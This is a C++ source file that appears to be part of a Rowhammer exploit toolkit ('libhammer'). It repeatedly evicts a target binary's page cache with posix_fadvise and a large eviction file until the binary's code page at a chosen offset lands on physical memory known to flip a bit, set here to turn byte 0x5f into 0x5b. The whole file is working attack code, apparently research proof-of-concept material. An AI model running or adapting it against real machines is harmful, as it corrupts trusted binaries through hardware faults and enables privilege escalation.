#include "libhammer.h"
#include "set"

using namespace std;

uint64_t current_pa, step = 0;

uint64_t get_binary_pa_offset(const string &path, uint64_t offset)
{
    int fd;
    unsigned sz;
    struct stat st;
    void *image;
    uint64_t ret;

    ASSERT(-1 != (fd = open(path.c_str(), O_RDONLY)) );
    fstat(fd, &st);
    sz = st.st_size;

    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fd, 0)) );
    mlock(image, sz);
    ret = v2p(image+offset);

    munlock(image, sz);
    close(fd);
    munmap(image, sz);
    return ret;
}

void waylaying(const string& path, int dir)
{
    uint64_t i, cached_ns, uncached_ns;
    char *memfile=0;
    int fd;
    uint64_t memfile_size;
    struct stat st;
    volatile uint64_t tmp = 0;
    myclock clk, cl2;

    // open eviction file
    ASSERT(-1 != (fd = open("/tmp/libhammer/disk/memfile", O_RDONLY | O_DIRECT)) );
    fstat(fd, &st);
    memfile_size = st.st_size;
    ASSERT(0 != (memfile = mmap(0, memfile_size, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0)) );

    // cout << "- start eviction" << endl;
    START_CLOCK(cl2, CLOCK_MONOTONIC);
    for (i=0; i<memfile_size; i+=PAGE_SIZE)
    {
        START_CLOCK(clk, CLOCK_MONOTONIC);
        tmp += *(volatile uint64_t *)(memfile + i);
        END_CLOCK(clk);

        if (i>0 && i % (1<<26)==0) {
           if (clk.ns < 150)
                cout << "-";
           else if (clk.ns < 1000)
                cout << ".";
           else
                cout << "+";
           cout.flush();

        }

    }
    END_CLOCK(cl2);
    cout << endl;
    close(fd);
    munmap(memfile, memfile_size);
}

// use fadvise to do waylaying!
void relocate_fadvise(const string& path)
{
    int fbin;
    struct stat st;

    ASSERT(-1 != (fbin = open(path.c_str(), O_RDONLY)) );
    fstat(fbin, &st);
    ASSERT(0 == posix_fadvise(fbin, 0, st.st_size, POSIX_FADV_DONTNEED));
    close(fbin);
}

int main(void)
{
    BinaryInfo target;

    target.path = "./target";
    target.flip_to = 0;
    target.offset = 0xfaf0;     // 0xf000 + 2800d
    target.orig = 0x5f;
    target.target = 0x5b;

    // 1. find template position to put binary file in
    load_hammer_result("hammer_result.csv");
    vector<HammerResult> tmpl = find_template(target);
    map<uint64_t, HammerResult> paset;
    set<uint64_t> waylaying_set;
    int uniq = 0, cnt = 0, dir = 1;
    uint64_t min_pa, max_pa;
    myclock myclk;
    //exit(0);
    if (tmpl.size() > 0)
    {
        // 2. waylaying
        for (HammerResult r : tmpl)
             paset[r.base] = r;

        // file+waylaying_offset should be on pa=HammerResult.base
        current_pa = get_binary_pa_offset(target.path, target.offset);
        min_pa = max_pa = current_pa;
        cout << "* current_pa = " << hex << current_pa << endl;
        //exit(0);
        START_CLOCK(myclk, CLOCK_MONOTONIC);
        while (paset.count(current_pa) == 0)
        {
            ++step;
            relocate_fadvise(target.path);
            //waylaying(target.path, 1);
            current_pa = get_binary_pa_offset(target.path, target.offset);
            if (current_pa < min_pa) min_pa = current_pa;
            if (current_pa > max_pa) max_pa = current_pa;
            END_CLOCK(myclk);
            waylaying_set.insert(current_pa);
            cout << "+ step " << dec << step << ": " << hex << current_pa
                 << dec << " coverage: " << uniq*4 << "k / " << (max_pa - min_pa)/1024 << " k, uptime: "
                 << (myclk.t1.tv_sec - myclk.t0.tv_sec) << "s." << endl;

            if (waylaying_set.size() == uniq)
                ++cnt;
            else cnt=0;
            if (cnt > 10)
            {
                cout << "* waylaying...";
                waylaying(target.path, dir);
                cnt=0;
                dir = -dir;
            }

            uniq = waylaying_set.size();
        }
    }
    cout << "* target pa=0x" << hex << current_pa << ", hammer template=";
    paset[current_pa].print();
    return 0;
}
